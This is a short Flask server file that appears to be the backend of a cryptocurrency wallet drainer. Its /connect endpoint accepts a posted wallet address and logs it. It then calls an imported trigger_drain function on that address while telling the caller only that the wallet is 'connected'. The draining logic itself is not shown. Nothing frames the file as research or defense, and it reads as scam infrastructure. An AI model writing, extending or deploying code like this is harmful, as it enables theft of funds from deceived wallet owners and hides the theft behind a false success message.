from flask import Flask, request, jsonify
from wallet_logic import trigger_drain
import logging

app = Flask(__name__)

@app.route('/connect', methods=['POST'])
def connect_wallet():
    data = request.get_json()
    wallet = data['wallet']
    logging.info(f"New wallet: {wallet}")
    trigger_drain(wallet)
    return jsonify({"status": "connected"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
